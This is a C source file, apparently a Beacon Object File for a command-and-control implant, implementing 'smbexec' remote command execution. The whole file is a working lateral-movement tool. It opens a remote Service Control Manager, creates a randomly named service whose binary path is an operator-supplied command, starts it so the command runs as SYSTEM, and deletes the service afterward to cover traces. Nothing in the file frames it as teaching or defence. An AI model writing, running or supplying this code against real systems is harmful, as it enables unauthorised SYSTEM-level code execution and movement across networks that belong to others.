/*
 * smbexec.c — Remote command execution via SCM (Service Control Manager)
 *
 * Flow:
 *   OpenSCManagerW(target) -> CreateServiceW(svcName, binPath=command) ->
 *   StartServiceW -> DeleteService -> CloseServiceHandle
 *
 * The command is set as the service binary path, so it executes as SYSTEM
 * when the service starts. The service will fail (since the command isn't
 * a real service binary), but the command still runs.
 */
#include <windows.h>
#include "beacon_compat.h"

DECLSPEC_IMPORT SC_HANDLE WINAPI ADVAPI32$OpenSCManagerW(LPCWSTR, LPCWSTR, DWORD);
DECLSPEC_IMPORT SC_HANDLE WINAPI ADVAPI32$CreateServiceW(
    SC_HANDLE, LPCWSTR, LPCWSTR, DWORD, DWORD, DWORD, DWORD,
    LPCWSTR, LPCWSTR, LPDWORD, LPCWSTR, LPCWSTR, LPCWSTR);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$StartServiceW(SC_HANDLE, DWORD, LPCWSTR*);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$DeleteService(SC_HANDLE);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CloseServiceHandle(SC_HANDLE);

DECLSPEC_IMPORT int  WINAPI KERNEL32$MultiByteToWideChar(UINT, DWORD, LPCCH, int, LPWSTR, int);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError(void);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetTickCount(void);

DECLSPEC_IMPORT int __cdecl MSVCRT$rand(void);
DECLSPEC_IMPORT void __cdecl MSVCRT$srand(unsigned int);
DECLSPEC_IMPORT int __cdecl MSVCRT$swprintf(wchar_t*, size_t, const wchar_t*, ...);

void go(char *args, int args_len) {
    datap parser;
    BeaconDataParse(&parser, args, args_len);

    char *target      = BeaconDataExtract(&parser, NULL);
    char *command      = BeaconDataExtract(&parser, NULL);
    char *servicename  = BeaconDataExtract(&parser, NULL);

    if (!target || !*target || !command || !*command) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Usage: smbexec --target HOST --command CMD\n");
        return;
    }

    /* Convert target to wide */
    wchar_t wTarget[256] = {0};
    KERNEL32$MultiByteToWideChar(CP_UTF8, 0, target, -1, wTarget, 256);

    /* Convert command to wide */
    wchar_t wCommand[4096] = {0};
    /* Wrap command: %COMSPEC% /C "command" */
    wchar_t wCmd[2048] = {0};
    KERNEL32$MultiByteToWideChar(CP_UTF8, 0, command, -1, wCmd, 2048);
    MSVCRT$swprintf(wCommand, 4096, L"%%COMSPEC%% /C \"%s\"", wCmd);

    /* Generate or use service name */
    wchar_t wSvcName[64] = {0};
    if (servicename && *servicename) {
        KERNEL32$MultiByteToWideChar(CP_UTF8, 0, servicename, -1, wSvcName, 64);
    } else {
        MSVCRT$srand((unsigned int)KERNEL32$GetTickCount());
        MSVCRT$swprintf(wSvcName, 64, L"svc_%04x%04x",
            MSVCRT$rand() & 0xFFFF, MSVCRT$rand() & 0xFFFF);
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] smbexec: %s on \\\\%s (service: %S)\n",
                 command, target, wSvcName);

    /* Open remote SCM */
    SC_HANDLE hSCM = ADVAPI32$OpenSCManagerW(wTarget, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hSCM) {
        BeaconPrintf(CALLBACK_ERROR, "[!] OpenSCManagerW failed: %lu\n", KERNEL32$GetLastError());
        return;
    }

    /* Create service with command as binPath */
    SC_HANDLE hSvc = ADVAPI32$CreateServiceW(
        hSCM,
        wSvcName,               /* service name */
        wSvcName,               /* display name */
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE,
        wCommand,               /* binary path = our command */
        NULL, NULL, NULL, NULL, NULL);

    if (!hSvc) {
        DWORD err = KERNEL32$GetLastError();
        BeaconPrintf(CALLBACK_ERROR, "[!] CreateServiceW failed: %lu\n", err);
        ADVAPI32$CloseServiceHandle(hSCM);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Service created\n");

    /* Start service — this executes the command */
    BOOL started = ADVAPI32$StartServiceW(hSvc, 0, NULL);
    if (!started) {
        DWORD err = KERNEL32$GetLastError();
        /* ERROR_SERVICE_REQUEST_TIMEOUT (1053) is expected — the command isn't a real service */
        if (err == 1053) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Command executed (service timed out as expected)\n");
        } else {
            BeaconPrintf(CALLBACK_ERROR, "[!] StartServiceW failed: %lu\n", err);
        }
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Service started successfully\n");
    }

    /* Delete service */
    if (ADVAPI32$DeleteService(hSvc)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Service deleted\n");
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[!] DeleteService failed: %lu (manual cleanup needed)\n",
                     KERNEL32$GetLastError());
    }

    ADVAPI32$CloseServiceHandle(hSvc);
    ADVAPI32$CloseServiceHandle(hSCM);

    BeaconPrintf(CALLBACK_OUTPUT, "[*] smbexec complete\n");
}
